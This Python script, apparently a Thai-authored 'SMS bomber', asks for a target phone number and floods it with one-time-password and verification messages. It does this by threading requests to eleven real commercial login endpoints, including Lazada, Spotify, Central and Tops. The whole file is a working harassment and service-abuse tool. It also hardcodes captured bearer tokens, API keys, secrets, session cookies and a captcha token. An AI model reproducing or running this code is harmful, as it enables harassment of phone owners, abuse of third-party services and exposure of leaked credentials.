
#
try:
	import requests
	import os
	import time
	import threading
	import random
	import colorama
	import argparse
except ImportError:
	os.system("pip install requests")
	os.system("pip install colorama")
	os.system("cls" if os.name == "nt" else "clear")
	# Thai text
	print("""\n
∙∙·▫▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ Potter ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫▫·∙∙
		+----------------------------------+
		#	ติดตั้งไลบรารีที่จําเป็นต่อโปรแกรมนี้แล้ว  #
		#								   #
		#			 Ș̴̨̪̣̥̟̹͉̭̰̈́́̓̀p̵̬̫͔̮̦̖̦͙̙̊̃̉͘ͅà̶̛̭͆͗́͝m̸̛̩̘̪̦̈̃̂̈́͘m̸̲̞͇̯̱̻̳̌̐͗͆̄̔̔ͅe̸̡̻̣̥̰̋͜͝ͅŗ̶̬̭̺̫̩̞̤̳̟̍̀̃͂̃V̷̱̙͕̟̳͚̓̈́̀̉͠3̷̢̫̙̝̅̓̓̈́̅̇̈́̐̑͑͜			  #
		#								   #
		#	   			YYY				   #
		+----------------------------------+
∙∙·▫▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ Potter ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫▫·∙∙
	""")
	# Eng text
	print("""\n
∙∙·▫▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ Potter ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫▫·∙∙
		+----------------------------------+
		# Installed all required libraries #
		#								   #
		#			 Ș̴̨̪̣̥̟̹͉̭̰̈́́̓̀p̵̬̫͔̮̦̖̦͙̙̊̃̉͘ͅà̶̛̭͆͗́͝m̸̛̩̘̪̦̈̃̂̈́͘m̸̲̞͇̯̱̻̳̌̐͗͆̄̔̔ͅe̸̡̻̣̥̰̋͜͝ͅŗ̶̬̭̺̫̩̞̤̳̟̍̀̃͂̃V̷̱̙͕̟̳͚̓̈́̀̉͠3̷̢̫̙̝̅̓̓̈́̅̇̈́̐̑͑͜			  #
		#								   #
		#	   			YYY				   #
		+----------------------------------+
∙∙·▫▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ Potter ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫▫·∙∙
	""")

from colorama import Fore, Back, Style
fore_colors = {
	"black": Fore.BLACK,
	"red": Fore.RED,
	"green": Fore.GREEN,
	"yellow": Fore.YELLOW,
	"blue": Fore.BLUE,
	"magenta": Fore.MAGENTA,
	"cyan": Fore.CYAN,
	"white": Fore.WHITE,
	"reset": Fore.RESET
}

back_colors = {
	"black": Back.BLACK,
	"red": Back.RED,
	"green": Back.GREEN,
	"yellow": Back.YELLOW,
	"blue": Back.BLUE,
	"magenta": Back.MAGENTA,
	"cyan": Back.CYAN,
	"white": Back.WHITE,
	"reset": Back.RESET
}

styles = {
	"dim": Style.DIM,
	"normal": Style.NORMAL,
	"bright": Style.BRIGHT,
	"reset": Style.RESET_ALL
}

banner_list = [
	"""
	 _______  _______  __   __  _______  _______  ______
	|  _    ||       ||  |_|  ||  _    ||       ||    _ |
	| |_|   ||   _   ||       || |_|   ||    ___||   | ||
	|       ||  | |  ||       ||       ||   |___ |   |_||_
	|  _   | |  |_|  ||       ||  _   | |    ___||    __  |
	| |_|   ||       || ||_|| || |_|   ||   |___ |   |  | |
	|_______||_______||_|   |_||_______||_______||___|  |_|
	""",
	#
	"""
	 _____           _
	| __  |___ _____| |_ ___ ___
	| __ -| . |     | . | -_|  _|
	|_____|___|_|_|_|___|___|_|
	""",
	#
	"""
	   ___             __
	  / _ )___  __ _  / /  ___ ____
	 / _  / _ \/  ' \/ _ \/ -_) __/
	/____/\___/_/_/_/_.__/\__/_/
	""",

	#
	"""
	 ______                  __
	|   __ \.-----.--------.|  |--.-----.----.
	|   __ <|  _  |        ||  _  |  -__|   _|
	|______/|_____|__|__|__||_____|_____|__|
	""",
	#
	"""
	 _______                __
	|   _   .-----.--------|  |--.-----.----.
	|.  1   |  _  |        |  _  |  -__|   _|
	|.  _   |_____|__|__|__|_____|_____|__|
	|:  1    \
	|::.. .  /
	`-------'
	"""
]

# function_command = argparse.ArgumentParser(description="Bomber By Potter")
# function_command.add_argument("-h", required=False, help="All commands of this tool")
# function_command.add_argument("--number", type=str, required=True, help="Target Phone Number!!")
# function_command.add_argument("-m", type=str, required=True, help="Mode of attack!! 1-2")
# function_command.add_argument("--amount", type=int, required=False, help="Amount SMS to target Phone Number!!")
# function_command.add_argument("--timesleep", type=int, default=10, required=False, help="How many seconds between each request? EX '10' wait 10 (second)")

# command = function_command.parse_args()

# เพื่อความสพดวกในการใช้
yes_answer = ["Y", "y", "Yes", "yes", "YES"]
no_answer = ["N", "n", "No", "no", "NO"]

# ล้าง terminal
def clear_terminal():
	os.system("clear")

# แบนเนอร์ มีการสุ่มแบนเนอร์
def banner():
	banner_random = random.choice(banner_list)
	#random_colour = random.choice(list(str(fore_colors.values()))
	os.system("cls" if os.name == "nt" else "clear")
	print(f"{fore_colors['green']}{styles['bright']}{banner_random}{styles['reset']}")
	print(f"{styles['bright']}By. Potter (Small Version V.1)")

# บอก โหมด ในการยิง
def mode():
	print(f"""{styles['bright']}
			Modes
  	[1] Bomb {back_colors['blue']}(cooldown 1 bomb per 2min){back_colors['reset']}
	[2] missile {back_colors['green']}(cooldown (as you want(second)) per 1 api){back_colors['reset']}
{styles['reset']}
""")


# เสร็จการยิงเบอร์
def done():
	print(f"	{back_colors['green']}{fore_colors['black']}{styles['bright']}[✔] Done!! {styles['reset']}")
	print(f"	{back_colors['magenta']}{fore_colors['black']}{styles['bright']}[✔] KILL this program.{styles['reset']}")

# ถามว่า แน่ใจเหรอว่าจะยิง
def are_u_sure_bout_this():
	are_u_sure = input(f"{styles['bright']} Are you sure?[Y/N]: {Fore.RESET}")
	if are_u_sure in yes_answer:
		print("OKAY..")
		time.sleep(1)

	elif are_u_sure in no_answer:
		print("OKAY..")
		time.sleep(1)
		exit()
	else:
		print(f"{styles['bright']}{fore_colors['red']}What?? Try Again..{Fore.RESET}")

# ถ้าเกิด Error code ให้แสดงข้อความ error
def error_code(res):
	if res.status_code in [400, 401, 419, 403]:
		print(f"{back_colors['red']}{Fore.BLACK}  ++This API has been blocked++{Fore.RESET}{back_colors['reset']}\n")
	else:
		pass

# โหมด 1 Bomb
def mode_1(phone_number):
	wait_time = 0.5
	amount_input = 1
	for i in range(amount_input):
		t_api_1 = threading.Thread(target=api_1, args=(phone_number, i))
		t_api_2 = threading.Thread(target=api_2, args=(phone_number, i))
		t_api_3 = threading.Thread(target=api_3, args=(phone_number, i))
		t_api_4 = threading.Thread(target=api_4, args=(phone_number, i))
		t_api_5 = threading.Thread(target=api_5, args=(phone_number, i))
		t_api_6 = threading.Thread(target=api_6, args=(phone_number, i))
		t_api_7 = threading.Thread(target=api_7, args=(phone_number, i))
		t_api_8 = threading.Thread(target=api_8, args=(phone_number, i))
		t_api_9 = threading.Thread(target=api_9, args=(phone_number, i))
		t_api_10 = threading.Thread(target=api_10, args=(phone_number, i))
		t_api_11 = threading.Thread(target=api_11, args=(phone_number, i))


		t_api_1.start()
		time.sleep(wait_time)
		t_api_2.start()
		time.sleep(wait_time)
		t_api_3.start()
		time.sleep(wait_time)
		t_api_4.start()
		time.sleep(wait_time)
		t_api_5.start()
		time.sleep(wait_time)
		t_api_6.start()
		time.sleep(wait_time)
		t_api_7.start()
		time.sleep(wait_time)
		t_api_8.start()
		time.sleep(wait_time)
		t_api_9.start()
		time.sleep(wait_time)
		t_api_10.start()
		time.sleep(wait_time)
		t_api_11.start()


		t_api_1.join()
		t_api_2.join()
		t_api_3.join()
		t_api_4.join()
		t_api_5.join()
		t_api_6.join()
		t_api_7.join()
		t_api_8.join()
		t_api_9.join()
		t_api_10.join()
		t_api_11.join()

# โหมด 2 มิสไซท์
def mode_2(phone_number, amount_input, wait_time):
	for i in range(amount_input):
		t_api_1 = threading.Thread(target=api_1, args=(phone_number, i))
		t_api_2 = threading.Thread(target=api_2, args=(phone_number, i))
		t_api_3 = threading.Thread(target=api_3, args=(phone_number, i))
		t_api_4 = threading.Thread(target=api_4, args=(phone_number, i))
		t_api_5 = threading.Thread(target=api_5, args=(phone_number, i))
		t_api_6 = threading.Thread(target=api_6, args=(phone_number, i))
		t_api_7 = threading.Thread(target=api_7, args=(phone_number, i))
		t_api_8 = threading.Thread(target=api_8, args=(phone_number, i))
		t_api_9 = threading.Thread(target=api_9, args=(phone_number, i))
		t_api_10 = threading.Thread(target=api_10, args=(phone_number, i))
		t_api_11 = threading.Thread(target=api_11, args=(phone_number, i))

		t_api_1.start()
		time.sleep(wait_time)
		t_api_2.start()
		time.sleep(wait_time)
		t_api_3.start()
		time.sleep(wait_time)
		t_api_4.start()
		time.sleep(wait_time)
		t_api_5.start()
		time.sleep(wait_time)
		t_api_6.start()
		time.sleep(wait_time)
		t_api_7.start()
		time.sleep(wait_time)
		t_api_8.start()
		time.sleep(wait_time)
		t_api_9.start()
		time.sleep(wait_time)
		t_api_10.start()
		time.sleep(wait_time)
		t_api_11.start()

		t_api_1.join()
		t_api_2.join()
		t_api_3.join()
		t_api_4.join()
		t_api_5.join()
		t_api_6.join()
		t_api_7.join()
		t_api_8.join()
		t_api_9.join()
		t_api_10.join()
		t_api_11.join()


# =================================================================== API Start
with open("user_agent/user_agent_lists.txt", 'r', encoding='utf-8') as file:
	user_agents = [line.strip() for line in file if line.strip()]

random_ua = random.choice(user_agents)
def api_1(number, i):
	url_true = f"https://true-shopping-api.azurewebsites.net/otp/request?platform=phone&value={number}&otp_type=register"

	headers_true = {
		"Host": "true-shopping-api.azurewebsites.net",
		"Connection": "keep-alive",
		"appId": "66ec06eeef500d59757b38fc",
		"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2ODZmNWYwNDI2MDc4YmJkZDMzODdlMjUiLCJpYXQiOjE3NTIxMjkyODQsImV4cCI6MTc1NDcyMTI4NH0.qkJNa3OyoDI0hxA3qijOH552JX54q6Bz_0tptIpzVso",
		"timestamp": "1752129483364",
		"sign": "30457FA2E1002EBBD753B60AAA79DD8C1EEC383D497589092FE395A9B3E81A04",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "Windows",
		"User-Agent": f"{random_ua}",
		"Content-Type": "application/json",
		"platform": "web",
		"Accept": "*/*",
		"Sec-GPC": "1",
		"Accept-Language": "en-US,en;q=0.9",
		"Origin": "https://www.true-shopping.com",
		"Referer": "https://www.true-shopping.com/"
	}
	try:

		res = requests.get(url_true, headers=headers_true)

		print(f"""+--------------------------------+
	API true-shopping
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception as e:
		print(e)

def api_2(number, i):
	url = "https://one-api.gettgo.com/api/v1/login/request_otp"

	headers = {
		"content-type": "application/json",
		"authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3aGl0ZS1sYWJlbC1hcGkiLCJleHAiOjIwNjc3MDY5NzYsImlhdCI6MTc1MjEzMDk3NiwiaXNzIjoid2hpdGVsYWJlbC1hdXRoIiwic3ViIjoiZ2V0dGdvIiwidHlwZSI6Imd1ZXN0IiwidXVpZCI6IiIsImVtYWlsIjoiIiwiZmlyc3RfbmFtZSI6IiIsImlkX2NhcmQiOiIiLCJsYXN0X25hbWUiOiIiLCJwaG9uZV9ubyI6IiIsInRyYW5zYWN0aW9uX2lkIjoiIn0.id-npxhwr942v_KhhbceoEsQkc5CDk5_INbyF2cNPOU",
		"x-api-secret": "EPr)&%%n1BCF$iHq{_1DPN/!m&%zUx{1h;:f7Hi,fX3&fRDd0w=PTe8R(N=N5?j",
		"x-api-key": "38d52ec5-326b-4ba0-915c-4e95b854b6ad",
		"user-agent": f"{random_ua}",
		"accept": "application/json"
	}

	body = {
		"mobile_number": str(number),
		"debug": False
	}

	try:
		res = requests.post(url, headers=headers, json=body)  # ✅ ใช้ POST + json
		print(f"""+--------------------------------+
	API gettgo
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
			""")
		error_code(res)
	except Exception as e:
		print("Error:", e)

def api_3(number, i):
	url = "https://www.kaitorasap.co.th/api-vue-2025/index.php/login/"

	headers = {
	"Host": "www.kaitorasap.co.th",
	"Connection": "keep-alive",
	"Content-Length": "2515",
	"sec-ch-ua-platform": "\"Windows\"",
	"User-Agent": f"{random_ua}",
	"Accept": "application/json, text/plain, */*",
	"sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Brave\";v=\"138\"",
	"Content-Type": "application/json",
	"Sec-GPC": "1",
	"Accept-Language": "en-US,en;q=0.8",
	"Origin": "https://www.kaitorasap.co.th",
	"Referer": "https://www.kaitorasap.co.th/login-with-mobile",
	"Accept-Encoding": "gzip, deflate, br, zstd",
	"Cookie": "PHPSESSID=0nat9v7c8t70h1jgh335islp73"
	}

	body = {
	"language": "th",
	"type_login": "mobile",
	"text_mobile_input": f"{number}",
	"google_token": "03AFcWeA7CVJdNflE54MOiJM4t5wXwOa13ExqvQVWMIZCYkza72RaptPy-Qz3ItLHEw5wDccsna68YIHdzKrHtDYKgVhTxEMB7akWuhEmpJynCdBfCBWjha4J2sawwBP-7HJ3pioneFvGVEQHe1I6Xq0xAWEoSK1Rw_4YkEl5TlangqoPH0cKAjxb7ZMhhYjwcUsrZLxgbxGR-zR_UdW0t4aT83pk7cmptwudAMA4LF2ZXv09y4aswVyXJOTuyNhT8SGzGQmwTLXLSR72n-l5stT2bYD-lJ18Q_YSU4gcM8CxDZlJciBX5JWToCKgbZnPL9VuqyKm8vfAMjwcprXkJY8dtgUpW00IQ5HEnouJ6r5ujzHEvzJBXi80QwlAYWutWouFxdKSBtQOdqfE7oCxfnj1MZUealNuGBOu8OAil1fQGugeeJBsptKm1C_CgKC1e0MgBzpXV1hSK7nkPYCrmPs6cHE7peRbn9m9Y7cCzsyNqdoAGfeGucEQ51LEfXpZJaeC0s_tQgS-r68vD9_hH6bvPojeuhSTT5uCmda2xiEYGq7YBFjMhLlHEkqA4dbQkWjzZIMwU7x_qhb9A3oKbMzlz64ldNQPSiNUT9GyQKFXEDH8oCHHQFZ2GIRaa-mAlbcucAh1AmFR3ZqTRcqsssdCki-DaVDfAjhIV08tP8XZq7SKdINZHE-anm3ZMKaGCPLpvVssDLcECvm5lUju2NUjxCOaANTZjVTMkzvzvpr1RPM833VR0mAiwkZgcS1Uy-ZnlmexGakBp8zP6ufTJwWJuN6G3UgLV2c6DOtjWCVus-tyYx2XbYjHcrA0xx5QWcb7hA54j0U0UlVGoqFT7GyDRBfe25kFmEgg2_l6kUD1kTZ48hQUAmpesYpcXcNPtTdvSIqc7Nyu8puQ8HrbKI97PRDDxTRGAej9QBP1YPLR1MGzI6CnazmOuOEaoOOfzSeHxHsQNCCnnGyr1uBokxS_ZnrpjvCXrRJZOMRFsuf3pQVZbS0wurCX5OC4zudipo51X4RnTKiCO9hVDthhvs0RCTLr_6OZlQ0dGuok007LyoQ41hkHMd9A2pS_hOWCgviHTmp2zoyEO1_TsqBkKjNiHiMUNgR-39hz61FsTQ_HDDyZcPvZnvOLk91r5cdvDE0YfJvTAJIkNc_rKkdQD2BjrPRMc3-N8Q4e3Z0nsP9hI-3Et5aYdU1S2yf8CZ7Rst_FxVP4X0ZDr2KeEHxjpr7LxFB_tTg83-Vzk9AyozJvRh9YzVuav70WTq1zkWGECvMsTnyy-Y6IImb1NpiQBox_d8hIaJKj2nZxY-DkHxg6MsdjNTSbQh_iZzjkgOEPsEAIn1KmFZfA38BMkj0roE17g4k3HQyks6VUmpWRjg6H-GCA3SvySaOyBm3DDS7MhLbKdtt498xAmK-IS_9zabphHnyfmoQOVXvTKZFH5wLY9Ejq0hhCMX4OX4_tXPcez14Fj1us75qVXRRs5P7VdUENJdIJazgloGyVY4ePnZsJdO16btPQM5RxB2jBlGiXXl2482LZk-3XDIG_jaydursZz_uZKA3CSNp5oOonKG-iYGBEM3ad9HxJtUYfTMhC1lgKtIPA9fXUynUJhV6GEMWciUladKeLL--TXhgKIrqsP1nYDJKWyMXZyu5E628MQfYXiotEjJ_MXEL8xFJtnpX8AD71Wjy-n63faj-zqnzgb22u0BN2BaN2J2ke3_TQ_k-kKJ78dDhfoLrfbCQSPjvCkdIIKbAG05r8ZSlxxMM8_1Trk4XFG6R_sFWOMDPA6bTyhujKvwbZvQUX4IgaxI-pxxu9AvPpeNsIIxqx1fLozO55HZIVLtXbwpMgAdCsgoUjqp1c8VW9ez693vM4Xv_qqQXGWe80dV0HIxH_Unnxu6lLHabUQrXaJtfodXmmW3K6BMoa8W_M1RQlTA9b9rfqpfIi0jtZZCveEKxpvY9CtVqya0skbnRCkdD-OQCSA5RFbJsfpXRCEGG4et2Y3nnNT0Y2BZi39BErss8JG4w95u0rAzSEW_W5MRMNh9eiWTX0vkUs8FHEL75qD16nP65_hwm_Hzu3Sfg96NpVm0vBxdpNIsUB9Pcz_Yh90l0zAEa73puAFrQONHNnTv4Iab60tjiCVzPTmxaxclwwgXagtEwJwqmniDtopbU0vulmbeJRIdjokzk5gLGYH8WW3bxn_qM9eIB5uLg9MBT_zQoxX4O8rE8RpnUTH8wjGeBm513nI7l8onHRSr2denR-AwqdQY4lYbNadFid8v9GihqMqa9fOw8y8u_Kf1hKgS5Jh0g8tGJeTQ9tYwOzZLjvICoUD60dQYw3cuK-vLkN95L87TqVA1b1mM9WN8ga1yRtsD4Yp429cKpJJNyH6O5knTRqW1q61ZOIVT3QDYlXqesRegtEpvGN_-9c"
	}

	try:
		res = requests.post(url, headers=headers, json=body)  # ✅ ใช้ POST + json
		print(f"""+--------------------------------+
	API kaitorasap
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
			""")
		error_code(res)
	except Exception as e:
		print("Error:", e)

def api_4(number, i):
	url = f"https://www.konvy.com/ajax/system.php?type=login&action=get_phone_code&phone={number}&token=b8cb5af32561b0a0d987ed393e3db960"

	headers = {
	"sec-ch-ua-platform": "\"Windows\"",
	"x-requested-with": "XMLHttpRequest",
	"user-agent": f"{random_ua}",
	"accept": "application/json, image/webp, text/javascript, */*; q=0.01",
	"sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Brave\";v=\"138\"",
	"sec-ch-ua-mobile": "?0",
	"sec-gpc": "1",
	"accept-language": "en-US,en;q=0.8",
	"referer": "https://www.konvy.com/",
	"cookie": "f34c_new_user_view_count=%7B%22count%22%3A3%2C%22expire_time%22%3A1752222074%7D",
	"priority": "u=1, i"
	}

	try:
		res = requests.post(url, headers=headers)  # ✅ ใช้ POST + json
		print(f"""+--------------------------------+
	API konvy
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception as e:
		print("Error:", e)

def api_5(number, i):
	url = f"https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{number}"

	headers = {
	"appid": "Website_Api",
	"user-agent": f"{random_ua}",
	"accept": "application/json, text/plain, */*",
	"appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2",
	"content-type": "application/x-www-form-urlencoded",
	"accept-language": "en-US,en;q=0.7",
	"origin": "https://th.kex-express.com",
	"referer": "https://th.kex-express.com/",
	"accept-encoding": "gzip, deflate, br, zstd",
	"priority": "u=1, i"
	}
	try:
		res = requests.post(url, headers=headers)  # ✅ ใช้ POST + json
		print(f"""+--------------------------------+
	API kex-express
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception as e:
		print("Error:", e)

def api_6(number, i):
	url = "https://member.lazada.co.th/user/api/validatePhone"

	headers = {
	"x-csrf-token": "4b797eeb1b31",
	"x-requested-with": "XMLHttpRequest",
	"user-agent": f"{random_ua}",
	"accept": "application/json, text/plain, */*",
	"content-type": "application/json",
	"accept-language": "en-US,en;q=0.9",
	"origin": "https://www.lazada.co.th",
	"referer": "https://www.lazada.co.th/",
	"accept-encoding": "gzip, deflate, br, zstd",
	"cookie": "epssw=9*mmC3rmj5IHzw9AvO3tIYZzbgR354gSaM3tZ3vttVQP-sooemgSNw0cFr3tvO3tvOutx72dmfrIS2M4nINtu0YgnNcW6pmemMLdDWDrimIfJRutERCdHmhCchk4igR4R2ilNXclaAofRuPh63u5Bnu2wYMAEiVccr3k_ldcVJ0RHmOiljoAuuuVuuapL-hSBctR4HBHhbjFVJQTWjeHGaCcl_eNs_W6gfzRLBvT1xuc3miAGI3bemmQCB_57E7iAydQHXXt6ndwOhZcmadMVO3ta2L0SYrPOZbv3kFjMo0CmsQyK6a5dt5g7tI8pWrI4AvBni73gUCIO_vJgLMhY42mt98OaQ",
	"priority": "u=1, i"
	}

	data = {
	"type": "ADDRESS",
	"phone": f"{number}",
	"X-CSRF-TOKEN": "4b797eeb1b31"
	}

	try:
		res = requests.post(url=url, headers=headers, json=data)
		print(f"""+--------------------------------+
	API Lazada (call)
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception as e:
		print(e)

def api_7(number, i):
	if number.startswith("0"):
		number = number[1:]

	url = "https://www.central.co.th/api/graphql/endpoint-2"

	headers = {
		"user-agent": f"{random_ua}",
		"content-type": "application/json",
		"accept": "*/*",
		"origin": "https://www.central.co.th",
		"referer": "https://www.central.co.th/"
	}

	data = {
		"query": f"""
			mutation {{
				SendMobileOtp(input: {{ mobile_number: "+66{number}", event: "login" }}) {{
					otp_reference_code
					message
					message_code
				}}
			}}
		"""
	}

	cookie = {
	"affinity": "\"223dbf0ab6b466fc\"",
	"lang": "th",
	"private_content_version": "0c4c89e33dbc0cf9af69ac3aa6c440f3"
	}
	try:
		res = requests.post(url=url, headers=headers, json=data, cookies=cookie)
		print(f"""+--------------------------------+
	API CENTRAL
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception as e:
		print(e)


def api_8(number, i):
	if number.startswith("0"):
		number = number[1:]

	url = "https://www.tops.co.th/api/graphql/endpoint-3"

	headers = {
	"store": "th",
	"access-control-allow-origin": "*",
	"user-agent": f"{random_ua}",
	"content-type": "application/json",
	"accept": "*/*",
	"accept-language": "en-US,en;q=0.8",
	"origin": "https://www.tops.co.th",
	"referer": "https://www.tops.co.th/th",
	"cookie": "omsCFR=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyT3JncyI6WyJDUkMiLCJDRlIiXSwidXNlcl9uYW1lIjoiYXBpdXNlcmNmcjRBRU0iLCJ1c2VyTG9jYXRpb25zIjpbXSwibG9jYWxlIjoiZW4iLCJleGNsdWRlZFVzZXJCdXNpbmVzc1VuaXRzIjpbXSwiYXV0aG9yaXRpZXMiOlsiUk9MRV9VU0VSIiwiUk9MRV9BUElVc2VyIl0sImNsaWVudF9pZCI6Im9tbmljb21wb25lbnQuMS4wLjAiLCJ1c2VyVGltZVpvbmUiOiJVVEMiLCJlZGdlIjowLCJzY29wZSI6WyJvbW5pIiwiY29tcG9uZW50Il0sIm9yZ2FuaXphdGlvbiI6IkNGUiIsImFjY2Vzc3RvQWxsQlVzIjpmYWxzZSwidGVuYW50SWQiOiJjcmNwb3ByMTFvIiwiZXhwIjoxNzUyMTg4OTAwLCJ1c2VyRGVmYXVsdHMiOltdLCJqdGkiOiI2ZjZhYjYyNi1iNmFjLTQ5MzEtYTE5My02MGMxZjVkYzQ3NDAiLCJ1c2VyQnVzaW5lc3NVbml0cyI6W119.gApkGXbSPg799_S0oWMpQThDyukg-mDxftDja0XM30fxPmJz8mnU04zkxkI1Zf11rwhsASKpq-ITIBdvnX2oKIrvN9-Xt07hCOFJKo-NwN_d0fB4gEEWItyNtXGLj306WQZqy_BEOdSBMnMVrArsOY8QqMKvN75r8xQrNgDddeXYbPqXGiUgm_cl_BHASgIeDoNUWAehFcpPZtaGFRiN5FxIyG-Wcveb9_DWjY_lhqWbwYaYz6dJAgriOS3-mwowdZYtJheM53Ctq0JmQK2V_Qh7oiEOZhYE31TLNsbHjNE5Vn-HPc6YtPt-r_ZOdgJDQ7lYOVuslo7XoIH-hpMhdg",
	}

	data = {
		"query": f"""
			mutation {{
				SendMobileOtp(input: {{ mobile_number: "+66{number}", event: "login" }}) {{
					otp_reference_code
					message
					message_code
				}}
			}}
		"""
	}

	try:
		res = requests.post(url=url, headers=headers, json=data)
		print(f"""+--------------------------------+
	API TOP ONLINES
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception as e:
		print(e)

def api_9(number, i):
	if number.startswith("0"):
		number = number[1:]
	url = f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{number}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{number}&phoneCountryCode=%2B66&b-uid=1.0.1"

	headers = {
	"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0....",
	"content-type": "application/json; charset=utf-8",
	"user-agent": f"{random_ua}",
	"accept": "*/*",
	"referer": "https://nocnoc.com/",
	"origin": "https://nocnoc.com",
	}

	data = {
	"lang": "th",
	"userType": "BUYER",
	"locale": "th",
	"orgIdfier": "scg",
	"phone": f"+66{number}",
	"phoneCountryCode": "+66",
	"b-uid": "1.0.1"
	}

	try:
		res = requests.get(url=url, headers=headers, json=data)
		print(f"""+--------------------------------+
	API NocNoc
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception as e:
		print(e)

def api_10(number, i):
	if number.startswith("0"):
		number = number[1:]
	url = "https://accounts.spotify.com/login/phone/code/request"

	headers = {
	"x-csrf-token": "013acda719d40d52e9a76260c70832b9623e97371331373532323333383532373338",
	"user-agent": f"{random_ua}",
	"accept": "application/json",
	"content-type": "application/x-www-form-urlencoded",
	"origin": "https://accounts.spotify.com",
	"referer": "https://accounts.spotify.com/en/login/phone?continue=https%3A%2F%2Fopen.spotify.com%2F&flow_ctx=fb8d38e3-b8bb-4225-bf7a-f34069720d25:1752255441",
	"cookie": "__Host-sp_csrf_sid=749eb3352b7bbbcbc3c1d680d1e737fc934c955c739faad1f362bbeef4c7ae53"
	}

	data = {
	"phonenumber": f"+66{number}"
	}

	try:
		res = requests.post(url=url, headers=headers, data=data)
		print(f"""+--------------------------------+
	API Spotify
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception as e:
		print(e)


def api_11(number, i):
	"""Jaomuehuay"""
	url = "https://jaomuehuay.io/api/auth/send-otp"
	headers = {
	"Host": "jaomuehuay.io",
	"User-Agent": f"{random_ua}",
	"Accept": "application/json",
	"Content-Type":
	"application/json",
	"Origin": "https://jaomuehuay.io",
	"Referer": "https://jaomuehuay.io/register/jaomuehuay"}
	payload = {"phone_number": number, "affiliateCode": "jaomuehuay", "type": 1}
	try:
		res = requests.post(url, headers=headers, json=payload, timeout=15)
		print(f"""+--------------------------------+
	API Jaomouehuay
	status code: {res.status_code}
	json: {res.text}
	round count: {i}
		""")
		error_code(res)
	except Exception:
		print(e)
# =================================================================== API End


# แสดง แบนเนอร์และโหมด ตอนเริ่มโปรแกรม
banner()
mode()


while True:
	# ระบุหมายเลขโทรศัพท์ Enter phone number
	print(f"{Fore.CYAN}{Style.BRIGHT}Enter the phone number you want to attack.{Fore.RESET}")

	phone_number = str(input(f"{Fore.YELLOW}->Phone Number: {Fore.RESET}"))
	if len(phone_number) < 10:
		print(f"{back_colors['red']}{Fore.BLACK}++The phone number is in the wrong format. Try again...{Fore.RESET}{back_colors['reset']}\n")
	else:
		break

# เลือกโหมดการทํางาน Select the mode
mode_input = input(f"{Fore.YELLOW}->Select the mode: {Fore.RESET}")

if mode_input == "1":
	are_u_sure_bout_this()
	try:
		mode_1(phone_number)
		done()
		print(f"	{back_colors['yellow']}Warning:{back_colors['reset']} {styles['bright']}pls wait for reloading about 1 or 1.30 min{styles['reset']}\n")

	except Exception as e:
		print(e)


elif mode_input == "2":
	print(f"\n{Fore.CYAN}Enter the sending amount.{Fore.RESET}")
	amount_input = int(input(f"{Fore.YELLOW}-->Amount: {Fore.RESET}"))
	print(f"\n{fore_colors['blue']}How many seconds between each request? EX '10' wait 10 (second){Fore.RESET}")
	try:
		wait_time = int(input(f"{Fore.YELLOW}-->Time sleep(second): {Fore.RESET}"))
		if wait_time <= 0:
			wait_time = 10
			print(f"{back_colors['yellow']}Warning:<{wait_time}>The time sleep is too low, I'll set it to `10s`{back_colors['reset']}")

	except ValueError:
		wait_time = 10
		print(f"{back_colors['yellow']}Warning:<{wait_time}>The time sleep is wrong, I'll set it to `10s`{back_colors['reset']}")

	print(f"< {wait_time} >")

	are_u_sure_bout_this()
	try:
		mode_2(phone_number, amount_input, wait_time)
		done()

	except Exception as e:
		print(e)

else:
	print(f"{back_colors['red']}Try Again{back_colors['reset']}")

